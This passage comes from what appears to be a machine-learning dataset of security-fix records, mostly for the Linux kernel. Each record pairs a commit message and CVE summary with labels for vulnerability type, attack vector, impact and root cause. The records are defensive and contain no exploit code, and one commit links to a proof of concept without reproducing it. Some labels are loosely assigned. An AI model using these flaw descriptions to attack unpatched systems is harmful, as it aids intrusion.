<minipli@googlemail.com>\nCc: Gerrit Renker <gerrit@erg.abdn.ac.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ccid3_hc_tx_getsockopt function in net\/dccp\/ccids\/ccid3.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak via getsockopt ( dccp_sockopt_ccid_tx_info ) the ccid3 code fails to initialize the trailing padding byte of struct tfrc_tx_info added for alignment on <number> bit architecture","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure","Attack Type":"local attacker"},{"commit_id":"2d8a041b7bfe1097af21441cb77d6af95f4f4680","cve_id":"CVE-2012-6540","cwe_id":"CWE-200","commit_message":"ipvs: fix info leak in getsockopt(IP_VS_SO_GET_TIMEOUT)\n\nIf at least one of CONFIG_IP_VS_PROTO_TCP or CONFIG_IP_VS_PROTO_UDP is\nnot set, __ip_vs_get_timeouts() does not fully initialize the structure\nthat gets copied to userland and that for leaks up to 12 bytes of kernel\nstack. Add an explicit memset(0) before passing the structure to\n__ip_vs_get_timeouts() to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Wensong Zhang <wensong@linux-vs.org>\nCc: Simon Horman <horms@verge.net.au>\nCc: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The do_ip_vs_get_ctl function in net\/netfilter\/ipvs\/ip_vs_ctl.c in the Linux kernel before 3.6 does not initialize a certain structure for IP_VS_SO_GET_TIMEOUT commands, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak in getsockopt ( ip_vs_so_get_timeout ) if at least one of config_ip_vs_proto_tcp or config_ip_vs_proto_udp is not set , __ip_vs_get_timeouts ( ) doe not fully initialize the structure that get copied to userland and that for leak up to <number> byte of kernel stack","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure for ip _ vs _ so _ get _ timeout commands","Attack Type":"local attacker"},{"commit_id":"43da5f2e0d0c69ded3d51907d9552310a6b545e8","cve_id":"CVE-2012-6539","cwe_id":"CWE-200","commit_message":"net: fix info leak in compat dev_ifconf()\n\nThe implementation of dev_ifconf() for the compat ioctl interface uses\nan intermediate ifc structure allocated in userland for the duration of\nthe syscall. Though, it fails to initialize the padding bytes inserted\nfor alignment and that for leaks four bytes of kernel stack. Add an\nexplicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The dev_ifconf function in net\/socket.c in the Linux kernel before 3.6 does not initialize a certain structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak in compat dev_ifconf ( ) the implementation of dev_ifconf ( ) for the compat ioctl interface us an intermediate ifc structure allocated in userland for the duration of the syscall","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure","Attack Type":"local attacker"},{"commit_id":"4c87308bdea31a7b4828a51f6156e6f721a1fcc9","cve_id":"CVE-2012-6538","cwe_id":"CWE-200","commit_message":"xfrm_user: fix info leak in copy_to_user_auth()\n\ncopy_to_user_auth() fails to initialize the remainder of alg_name and\ntherefore discloses up to 54 bytes of heap memory via netlink to\nuserland.\n\nUse strncpy() instead of strcpy() to fill the trailing bytes of alg_name\nwith null bytes.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The copy_to_user_auth function in net\/xfrm\/xfrm_user.c in the Linux kernel before 3.6 uses an incorrect C library function for copying a string, which allows local users to obtain sensitive information from kernel heap memory by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"fix info leak in copy_to_user_auth ( ) copy_to_user_auth ( ) fails to initialize the remainder of alg_name and therefore discloses up to <number> byte of heap memory via netlink to userland","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"uses an incorrect c library function for copying a string","Attack Type":"local attacker"},{"commit_id":"f778a636713a435d3a922c60b1622a91136560c1","cve_id":"CVE-2012-6537","cwe_id":"CWE-200","commit_message":"xfrm_user: fix info leak in copy_to_user_state()\n\nThe memory reserved to dump the xfrm state includes the padding bytes of\nstruct xfrm_usersa_info added by the compiler for alignment (7 for\namd64, 3 for i386). Add an explicit memset(0) before filling the buffer\nto avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/xfrm\/xfrm_user.c in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"fix info leak in copy_to_user_state ( ) the memory reserved to dump the xfrm state includes the padding byte of struct xfrm_usersa_info added by the compiler for alignment ( <number> for amd64 , <number> for i386 )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"ecd7918745234e423dd87fcc0c077da557909720","cve_id":"CVE-2012-6536","cwe_id":"CWE-200","commit_message":"xfrm_user: ensure user supplied esn replay window is valid\n\nThe current code fails to ensure that the netlink message actually\ncontains as many bytes as the header indicates. If a user creates a new\nstate or updates an existing one but does not supply the bytes for the\nwhole ESN replay window, the kernel copies random heap bytes into the\nreplay bitmap, the ones happen to follow the XFRMA_REPLAY_ESN_VAL\nnetlink attribute. This leads to following issues:\n\n1. The replay window has random bits set confusing the replay handling\n   code later on.\n\n2. A malicious user could use this flaw to leak up to ~3.5kB of heap\n   memory when she has access to the XFRM netlink interface (requires\n   CAP_NET_ADMIN).\n\nKnown users of the ESN replay window are strongSwan and Steffen's\niproute2 patch (<http:\/\/patchwork.ozlabs.org\/patch\/85962\/>). The latter\nuses the interface with a bitmap supplied while the former does not.\nstrongSwan is therefore prone to run into issue 1.\n\nTo fix both issues without breaking existing userland allow using the\nXFRMA_REPLAY_ESN_VAL netlink attribute with either an empty bitmap or a\nfully specified one. For the former case we initialize the in-kernel\nbitmap with zero, for the latter we copy the user supplied bitmap. For\nstate updates the full bitmap must be supplied.\n\nTo prevent overflows in the bitmap length calculation the maximum size\nof bmp_len is limited to 128 by this patch -- resulting in a maximum\nreplay window of 4096 packets. This should be sufficient for all real\nlife scenarios (RFC 4303 recommends a default replay window size of 64).\n\nCc: Steffen Klassert <steffen.klassert@secunet.com>\nCc: Martin Willi <martin@revosec.ch>\nCc: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/xfrm\/xfrm_user.c in the Linux kernel before 3.6 does not verify that the actual Netlink message length is consistent with a certain header field, which allows local users to obtain sensitive information from kernel heap memory by leveraging the CAP_NET_ADMIN capability and providing a (1) new or (2) updated state.","commit_message_1":"ensure user supplied esn replay window is valid the current code fails to ensure that the netlink message actually contains a many byte a the header indicates","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by leveraging the cap _ net _ admin capability and providing a ( 1 ) new or ( 2 ) updated state","Impact":"obtain sensitive information from kernel heap memory","Root Cause":"does not verify that the actual netlink message length is consistent with a certain header field","Attack Type":"local attacker"},{"commit_id":"9c52057c698fb96f8f07e7a4bcf4801a092bda89","cve_id":"CVE-2012-5375","cwe_id":"CWE-310","commit_message":"Btrfs: fix hash overflow handling\n\nThe handling for directory crc hash overflows was fairly obscure,\nsplit_leaf returns EOVERFLOW when we try to extend the item and that is\nsupposed to bubble up to userland.  For a while it did so, but along the\nway we added better handling of errors and forced the FS readonly if we\nhit IO errors during the directory insertion.\n\nAlong the way, we started testing only for EEXIST and the EOVERFLOW case\nwas dropped.  The end result is that we may force the FS readonly if we\ncatch a directory hash bucket overflow.\n\nThis fixes a few problem spots.  First I add tests for EOVERFLOW in the\nplaces where we can safely just return the error up the chain.\n\nbtrfs_rename is harder though, because it tries to insert the new\ndirectory item only after it has already unlinked anything the rename\nwas going to overwrite.  Rather than adding very complex logic, I added\na helper to test for the hash overflow case early while it is still safe\nto bail out.\n\nSnapshot and subvolume creation had a similar problem, so they are using\nthe new helper now too.\n\nSigned-off-by: Chris Mason <chris.mason@fusionio.com>\nReported-by: Pascal Junod <pascal@junod.info>","summary":"The CRC32C feature in the Btrfs implementation in the Linux kernel before 3.8-rc1 allows local users to cause a denial of service (prevention of file creation) by leveraging the ability to write to a directory important to the victim, and creating a file with a crafted name that is associated with a specific CRC32C hash value.","commit_message_1":"fix hash overflow handling the handling for directory crc hash overflow wa fairly obscure , split_leaf return eoverflow when we try to extend the item and that is supposed to bubble up to userland","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by leveraging the ability to write to a directory important to the victim , and creating a file with a crafted name that is associated with a specific crc32c hash value .","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b66c5984017533316fd1951770302649baf1aa33","cve_id":"CVE-2012-4530","cwe_id":"CWE-200","commit_message":"exec: do not leave bprm->interp on stack\n\nIf a series of scripts are executed, each triggering module loading via\nunprintable bytes in the script header, kernel stack contents can leak\ninto the command line.\n\nNormally execution of binfmt_script and binfmt_misc happens recursively.\nHowever, when modules are enabled, and unprintable bytes exist in the\nbprm->buf, execution will restart after attempting to load matching\nbinfmt modules.  Unfortunately, the logic in binfmt_script and\nbinfmt_misc does not expect to get restarted.  They leave bprm->interp\npointing to their local stack.  This means on restart bprm->interp is\nleft pointing into unused stack memory which can then be copied into the\nuserspace argv areas.\n\nAfter additional study, it seems that both recursion and restart remains\nthe desirable way to handle exec with scripts, misc, and modules.  As\nsuch, we need to protect the changes to interp.\n\nThis changes the logic to require allocation for any changes to the\nbprm->interp.  To avoid adding a new kmalloc to every exec, the default\nvalue is left as-is.  Only when passing through binfmt_script or\nbinfmt_misc does an allocation take place.\n\nFor a proof of concept, see DoTest.sh from:\n\n   http:\/\/www.halfdog.net\/Security\/2012\/LinuxKernelBinfmtScriptStackDataDisclosure\/\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: halfdog <me@halfdog.net>\nCc: P J P <ppandit@redhat.com>\nCc: Alexander Viro <viro@zeniv.linux.org.uk>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The load_script function in fs\/binfmt_script.c in the Linux kernel before 3.7.2 does not properly handle recursion, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"do not leave bprm- > interp on stack if a series of script are executed , each triggering module loading via unprintable byte in the script header , kernel stack content can leak into the command line","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly handle recursion","Attack Type":"local attacker"},{"commit_id":"67de956ff5dc1d4f321e16cfbd63f5be3b691b43","cve_id":"CVE-2012-3364","cwe_id":"CWE-119","commit_message":"NFC: Prevent multiple buffer overflows in NCI\n\nFix multiple remotely-exploitable stack-based buffer overflows due to\nthe NCI code pulling length fields directly from incoming frames and\ncopying too much data into statically-sized arrays.\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com>\nCc: stable@kernel.org\nCc: security@kernel.org\nCc: Lauro Ramos Venancio <lauro.venancio@openbossa.org>\nCc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org>\nCc: Samuel Ortiz <sameo@linux.intel.com>\nCc: David S. Miller <davem@davemloft.net>\nAcked-by: Ilan Elias <ilane@ti.com>\nSigned-off-by: Samuel Ortiz <sameo@linux.intel.com>","summary":"Multiple stack-based buffer overflows in the Near Field Communication Controller Interface (NCI) in the Linux kernel before 3.4.5 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via incoming frames with crafted length fields.","commit_message_1":"prevent multiple buffer overflow in nci fix multiple remotely-exploitable stack-based buffer overflow due to the nci code pulling length field directly from incoming frame and copying too much data into statically-sized array","Vulnerability Type":"buffer overflow","Attack Vector":"via incoming frames with crafted length fields","Impact":"cause a denial of service ( crash ) and possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the NCI code","Attack Type":"remote attacker"},{"commit_id":"b92946e2919134ebe2a4083e4302236295ea2a73","cve_id":"CVE-2012-2119","cwe_id":"CWE-119","commit_message":"macvtap: zerocopy: validate vectors before building skb\n\nThere're several reasons that the vectors need to be validated:\n\n- Return error when caller provides vectors whose num is greater than UIO_MAXIOV.\n- Linearize part of skb when userspace provides vectors grater than MAX_SKB_FRAGS.\n- Return error when userspace provides vectors whose total length may exceed\n- MAX_SKB_FRAGS * PAGE_SIZE.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>","summary":"Buffer overflow in the macvtap device driver in the Linux kernel before 3.4.5, when running in certain configurations, allows privileged KVM guest users to cause a denial of service (crash) via a long descriptor with a long vector length.","commit_message_1":"zerocopy : validate vector before building skb there 're several reason that the vector need to be validated : - return error when caller provides vector whose num is greater than uio_maxiov","Vulnerability Type":"buffer overflow","Attack Vector":"via a long descriptor with a long vector length","Impact":"cause a denial of service ( crash )","Root Cause":"caused by the failure to validate the vector length prior","Attack Type":"local attacker"},{"commit_id":"db64ca25d661a47b996b4e2645998b5d7f0eb52c","cve_id":"CVE-2012-1016","cwe_id":null,"commit_message":"PKINIT (draft9) null ptr deref [CVE-2012-1016]\n\nDon't check for an agility KDF identifier in the non-draft9 reply\nstructure when we're building a draft9 reply, because it'll be NULL.\n\nThe KDC plugin for PKINIT can dereference a null pointer when handling\na draft9 request, leading to a crash of the KDC process.  An attacker\nwould need to have a valid PKINIT certificate, or an unauthenticated\nattacker could execute the attack if anonymous PKINIT is enabled.\n\nCVSSv2 vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:P\/E:P\/RL:O\/RC:C\n\n[tlyu@mit.edu: reformat comment and edit log message]\n\n(back ported from commit cd5ff932c9d1439c961b0cf9ccff979356686aff)\n\nticket: 7527 (new)\nversion_fixed: 1.10.4\nstatus: resolved","summary":"The pkinit_server_return_padata function in plugins\/preauth\/pkinit\/pkinit_srv.c in the PKINIT implementation in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.4 attempts to find an agility KDF identifier in inappropriate circumstances, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted Draft 9 request.","commit_message_1":"pkinit ( draft9 ) null ptr deref [ <cve_id> ] do n't check for an agility kdf identifier in the non-draft9 reply structure when we 're building a draft9 reply , because it 'll be null","Vulnerability Type":"NULL pointer dereference","Attack Vector":"By sending a specially-crafted Draft 9 request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"b5a1eeef04cc7859f34dec9b72ea1b28e4aba07c","cve_id":"CVE-2011-4604","cwe_id":"CWE-119","commit_message":"batman-adv: Only write requested number of byte to user buffer\n\nDon't write more than the requested number of bytes of an batman-adv icmp\npacket to the userspace buffer. Otherwise unrelated userspace memory might get\noverridden by the kernel.\n\nSigned-off-by: Sven Eckelmann <sven@narfation.org>\nSigned-off-by: Marek Lindner <lindner_marek@yahoo.de>","summary":"The bat_socket_read function in net\/batman-adv\/icmp_socket.c in the Linux kernel before 3.3 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted batman-adv ICMP packet.","commit_message_1":"only write requested number of byte to user buffer do n't write more than the requested number of byte of an batman-adv icmp packet to the userspace buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted batman - adv icmp packet","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the bat_socket_read() function","Attack Type":"remote attacker"},{"commit_id":"ae53b5bd77719fed58086c5be60ce4f22bffe1c6","cve_id":"CVE-2011-4348","cwe_id":"CWE-362","commit_message":"sctp: Fix another socket race during accept\/peeloff\n\nThere is a race between sctp_rcv() and sctp_accept() where we\nhave moved the association from the listening socket to the\naccepted socket, but sctp_rcv() processing cached the old\nsocket and continues to use it.\n\nThe easy solution is to check for the socket mismatch once we've\ngrabed the socket lock.  If we hit a mis-match, that means\nthat were are currently holding the lock on the listening socket,\nbut the association is refrencing a newly accepted socket.  We need\nto drop the lock on the old socket and grab the lock on the new one.\n\nA more proper solution might be to create accepted sockets when\nthe new association is established, similar to TCP.  That would\neliminate the race for 1-to-1 style sockets, but it would still\nexisting for 1-to-many sockets where a user wished to peeloff an\nassociation.  For now, we'll live with this easy solution as\nit addresses the problem.\n\nReported-by: Michal Hocko <mhocko@suse.cz>\nReported-by: Karsten Keil <kkeil@suse.de>\nSigned-off-by: Vlad Yasevich <vladislav.yasevich@hp.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the sctp_rcv function in net\/sctp\/input.c in the Linux kernel before 2.6.29 allows remote attackers to cause a denial of service (system hang) via SCTP packets.  NOTE: in some environments, this issue exists because of an incomplete fix for CVE-2011-2482.","commit_message_1":"fix another socket race during accept\/peeloff there is a race between sctp_rcv ( ) and sctp_accept ( ) where we have moved the association from the listening socket to the accepted socket , but sctp_rcv ( ) processing cached the old socket and continues to use it","Vulnerability Type":"Race Condition","Attack Vector":"via sctp packets","Impact":"cause a denial of service ( system hang )","Root Cause":"Race condition","Attack Type":"remote attacker"},{"commit_id":"c4e7f9022e506c6635a5037713c37118e23193e4","cve_id":"CVE-2011-4347","cwe_id":"CWE-264","commit_message":"KVM: Device assignment permission checks\n\n(cherry picked from commit 3d27e23b17010c668db311140b17bbbb70c78fb9)\n\nOnly allow KVM device assignment to attach to devices which:\n\n - Are not bridges\n - Have BAR resources (assume others are special devices)\n - The user has permissions to use\n\nAssigning a bridge is a configuration error, it's not supported, and\ntypically doesn't result in the behavior the user is expecting anyway.\nDevices without BAR resources are typically chipset components that\nalso don't have host drivers.  We don't want users to hold such devices\ncaptive or cause system problems by fencing them off into an iommu\ndomain.  We determine \"permission to use\" by testing whether the user\nhas access to the PCI sysfs resource files.  By default a normal user\nwill not have access to these files, so it provides a good indication\nthat an administration agent has granted the user access to the device.\n\n[Yang Bai: add missing #include]\n[avi: fix comment style]\n\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>\nSigned-off-by: Yang Bai <hamo.by@gmail.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>","summary":"The kvm_vm_ioctl_assign_device function in virt\/kvm\/assigned-dev.c in the KVM subsystem in the Linux kernel before 3.1.10 does not verify permission to access PCI configuration space and BAR resources, which allows host OS users to assign PCI devices and cause a denial of service (host OS crash) via a KVM_ASSIGN_PCI_DEVICE operation.","commit_message_1":"device assignment permission check ( cherry picked from commit 3d27e23b17010c668db311140b17bbbb70c78fb9 ) only allow kvm device assignment to attach to device which : - are not bridge - have bar resource ( assume others are special device ) - the user ha permission to use assigning a bridge is a configuration error , it 's not supported , and typically doe n't result in the behavior the user is expecting anyway","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a kvm _ assign _ pci _ device operation","Impact":"assign pci devices and cause a denial of service ( host os crash )","Root Cause":"does not verify permission to access pci configuration space and bar resources","Attack Type":"local attacker"},{"commit_id":"64dd153c83743af81f20924c6343652d731eeecb","cve_id":"CVE-2011-4098","cwe_id":"CWE-119","commit_message":"GFS2: rewrite fallocate code to write blocks directly\n\nGFS2's fallocate code currently goes through the page cache. Since it's only\nwriting to the end of the file or to holes in it, it doesn't need to, and it\nwas causing issues on low memory environments. This patch pulls in some of\nSteve's block allocation work, and uses it to simply allocate the blocks for\nthe file, and zero them out at allocation time.  It provides a slight\nperformance increase, and it dramatically simplifies the code.\n\nSigned-off-by: Benjamin Marzinski <bmarzins@redhat.com>\nSigned-off-by: Steven Whitehouse <swhiteho@redhat.com>","summary":"The fallocate implementation in the GFS2 filesystem in the Linux kernel before 3.2 relies on the page cache, which might allow local users to cause a denial of service by preallocating blocks in certain situations involving insufficient memory.","commit_message_1":"rewrite fallocate code to write block directly gfs2 's fallocate code currently go through the page cache","Vulnerability Type":"buffer overflow","Attack Vector":"by preallocating blocks in certain situations involving insufficient memory","Impact":"cause a denial of service","Root Cause":"caused by an error within the fallocate implementation","Attack Type":"local attacker"},{"commit_id":"f8e9881c2aef1e982e5abc25c046820cd0b7cf64","cve_id":"CVE-2011-4087","cwe_id":"CWE-399","commit_message":"bridge: reset IPCB in br_parse_ip_options\n\nCommit 462fb2af9788a82 (bridge : Sanitize skb before it enters the IP\nstack), missed one IPCB init before calling ip_options_compile()\n\nThanks to Scot Doyle for his tests and bug reports.\n\nReported-by: Scot Doyle <lkml@scotdoyle.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Hiroaki SHIMODA <shimoda.hiroaki@gmail.com>\nAcked-by: Bandan Das <bandan.das@stratus.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nCc: Jan L\u00fcbbe <jluebbe@debian.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The br_parse_ip_options function in net\/bridge\/br_netfilter.c in the Linux kernel before 2.6.39 does not properly initialize a certain data structure, which allows remote attackers to cause a denial of service by leveraging connectivity to a network interface that uses an Ethernet bridge device.","commit_message_1":"reset ipcb in br_parse_ip_options commit 462fb2af9788a82 ( bridge : sanitize skb before it enters the ip stack ) , missed one ipcb init before calling ip_options_compile ( ) thanks to scot doyle for his test and bug report","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging connectivity to a network interface that uses an ethernet bridge device","Impact":"cause a denial of service","Root Cause":"does not properly initialize a certain data structure","Attack Type":"remote attacker"},{"commit_id":"667eff35a1f56fa74ce98a0c7c29a40adc1ba4e3","cve_id":"CVE-2011-3638","cwe_id":null,"commit_message":"ext4: reimplement convert and split_unwritten\n\nReimplement ext4_ext_convert_to_initialized() and\next4_split_unwritten_extents() using ext4_split_extent()\n\nSigned-off-by: Yongqiang Yang <xiaoqiangnk@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nTested-by: Allison Henderson <achender@linux.vnet.ibm.com>","summary":"fs\/ext4\/extents.c in the Linux kernel before 3.0 does not mark a modified extent as dirty in certain cases of extent splitting, which allows local users to cause a denial of service (system crash) via vectors involving ext4 umount and mount operations.","commit_message_1":"reimplement convert and split_unwritten reimplement ext4_ext_convert_to_initialized ( ) and ext4_split_unwritten_extents ( ) using ext4_split_extent ( )","Vulnerability Type":"system crash","Attack Vector":"via vectors involving ext4 umount and mount operations","Impact":"cause a denial of service ( system crash )","Root Cause":"does not mark a modified extent as dirty","Attack Type":"local attacker"},{"commit_id":"a5b2c5b2ad5853591a6cac6134cd0f599a720865","cve_id":"CVE-2011-3619","cwe_id":"CWE-20","commit_message":"AppArmor: fix oops in apparmor_setprocattr\n\nWhen invalid parameters are passed to apparmor_setprocattr a NULL deref\noops occurs when it tries to record an audit message. This is because\nit is passing NULL for the profile parameter for aa_audit. But aa_audit\nnow requires that the profile passed is not NULL.\n\nFix this by passing the current profile on the task that is trying to\nsetprocattr.\n\nSigned-off-by: Kees Cook <kees@ubuntu.com>\nSigned-off-by: John Johansen <john.johansen@canonical.com>\nCc: stable@kernel.org\nSigned-off-by: James Morris <jmorris@namei.org>","summary":"The apparmor_setprocattr function in security\/apparmor\/lsm.c in the Linux kernel before 3.0 does not properly handle invalid parameters, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact by writing to a \/proc\/#####\/attr\/current file.","commit_message_1":"fix oops in apparmor_setprocattr when invalid parameter are passed to apparmor_setprocattr a null deref oops occurs when it try to record an audit message","Vulnerability Type":"Improper Input Validation","Attack Vector":"by writing to a \/proc\/#####\/attr\/current file","Impact":"cause a denial of service ( pointer dereference and oops ) or possibly have unspecified other impact","Root Cause":"does not properly handle invalid parameters","Attack Type":"local attacker"},{"commit_id":"aba8d056078e47350d85b06a9cabd5afcc4b72ea","cve_id":"CVE-2011-2905","cwe_id":null,"commit_message":"perf tools: do not look at .\/config for configuration\n\nIn addition to \/etc\/perfconfig and $HOME\/.perfconfig, perf looks for\nconfiguration in the file .\/config, imitating git which looks at\n$GIT_DIR\/config.  If .\/config is not a perf configuration file, it\nfails, or worse, treats it as a configuration file and changes behavior\nin some unexpected way.\n\n\"config\" is not an unusual name for a file to be lying around and perf\ndoes not have a private directory dedicated for its own use, so let's\njust stop looking for configuration in the cwd.  Callers needing\ncontext-sensitive configuration can use the PERF_CONFIG environment\nvariable.\n\nRequested-by: Christian Ohm <chr.ohm@gmx.net>\nCc: 632923@bugs.debian.org\nCc: Ben Hutchings <ben@decadent.org.uk>\nCc: Christian Ohm <chr.ohm@gmx.net>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Paul Mackerras <paulus@samba.org>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nLink: http:\/\/lkml.kernel.org\/r\/20110805165838.GA7237@elie.gateway.2wire.net\nSigned-off-by: Jonathan Nieder <jrnieder@gmail.com>\nSigned-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>","summary":"Untrusted search path vulnerability in the perf_config function in tools\/perf\/util\/config.c in perf, as distributed in the Linux kernel before 3.1, allows local users to overwrite arbitrary files via a crafted config file in the current working directory.","commit_message_1":"do not look at","Vulnerability Type":"untrusted search path","Attack Vector":"via a crafted config file in the current working directory ","Impact":"overwrite arbitrary files","Root Cause":"caused by the loading of the configuration file from the current directory by the perf utility","Attack Type":"local attacker"},{"commit_id":"0b760113a3a155269a3fba93a409c640031dd68f","cve_id":"CVE-2011-2491","cwe_id":"CWE-399","commit_message":"NLM: Don't hang forever on NLM unlock requests\n\nIf the NLM daemon is killed on the NFS server, we can currently end up\nhanging forever on an 'unlock' request, instead of aborting. Basically,\nif the rpcbind request fails, or the server keeps returning garbage, we\nreally want to quit instead of retrying.\n\nTested-by: Vasily Averin <vvs@sw.ru>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>\nCc: stable@kernel.org","summary":"The Network Lock Manager (NLM) protocol implementation in the NFS client functionality in the Linux kernel before 3.0 allows local users to cause a denial of service (system hang) via a LOCK_UN flock system call.","commit_message_1":"do n't hang forever on nlm unlock request if the nlm daemon is killed on the nfs server , we can currently end up hanging forever on an 'unlock ' request , instead of aborting","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a lock _ un flock system call","Impact":"cause a denial of service ( system hang )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"ea2bc483ff5caada7c4aa0d5fbf87d3a6590273d","cve_id":"CVE-2011-2482","cwe_id":null,"commit_message":"[SCTP]: Fix assertion (!atomic_read(&sk->sk_rmem_alloc)) failed message\n\nIn current implementation, LKSCTP does receive buffer accounting for\ndata in sctp_receive_queue and pd_lobby. However, LKSCTP don't do\naccounting for data in frag_list when data is fragmented. In addition,\nLKSCTP doesn't do accounting for data in reasm and lobby queue in\nstructure sctp_ulpq.\nWhen there are date in these queue, assertion failed message is printed\nin inet_sock_destruct because sk_rmem_alloc of oldsk does not become 0\nwhen socket is destroyed.\n\nSigned-off-by: Tsutomu Fujii <t-fujii@nb.jp.nec.com>\nSigned-off-by: Vlad Yasevich <vladislav.yasevich@hp.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"A certain Red Hat patch to the sctp_sock_migrate function in net\/sctp\/socket.c in the Linux kernel before 2.6.21, as used in Red Hat Enterprise Linux (RHEL) 5, allows remote attackers to cause a denial of service (NULL pointer dereference and OOPS) via a crafted SCTP packet.","commit_message_1":"fix assertion ( ! atomic_read ( & sk- > sk_rmem_alloc ) ) failed message in current implementation , lksctp doe receive buffer accounting for data in sctp_receive_queue and pd_lobby","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted sctp packet","Impact":"cause a denial of service ( pointer dereference and oops )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"78f11a255749d09025f54d4e2df4fbcb031530e2","cve_id":"CVE-2011-2479","cwe_id":"CWE-399","commit_message":"mm: thp: fix \/dev\/zero MAP_PRIVATE and vm_flags cleanups\n\nThe huge_memory.c THP page fault was allowed to run if vm_ops was null\n(which would succeed for \/dev\/zero MAP_PRIVATE, as the f_op->mmap wouldn't\nsetup a special vma->vm_ops and it would fallback to regular anonymous\nmemory) but other THP logics weren't fully activated for vmas with vm_file\nnot NULL (\/dev\/zero has a not NULL vma->vm_file).\n\nSo this removes the vm_file checks so that \/dev\/zero also can safely use\nTHP (the other albeit safer approach to fix this bug would have been to\nprevent the THP initial page fault to run if vm_file was set).\n\nAfter removing the vm_file checks, this also makes huge_memory.c stricter\nin khugepaged for the DEBUG_VM=y case.  It doesn't replace the vm_file\ncheck with a is_pfn_mapping check (but it keeps checking for VM_PFNMAP\nunder VM_BUG_ON) because for a is_cow_mapping() mapping VM_PFNMAP should\nonly be allowed to exist before the first page fault, and in turn when\nvma->anon_vma is null (so preventing khugepaged registration).  So I tend\nto think the previous comment saying if vm_file was set, VM_PFNMAP might\nhave been set and we 